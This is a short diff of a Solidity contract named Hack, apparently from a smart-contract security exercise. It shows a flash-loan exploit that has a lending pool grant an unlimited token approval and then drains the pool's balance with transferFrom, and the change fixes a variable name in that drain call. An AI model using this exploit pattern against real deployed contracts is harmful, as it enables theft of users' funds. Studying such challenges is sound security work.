@@ -51,6 +51,6 @@ contract Hack {
             type(uint).max
         );
         pool.flashLoan(0, msg.sender, _token, data);
-        token.transferFrom(pool, msg.sender, token.balanceOf(_pool));
+        token.transferFrom(_pool, msg.sender, token.balanceOf(_pool));
     }
 }
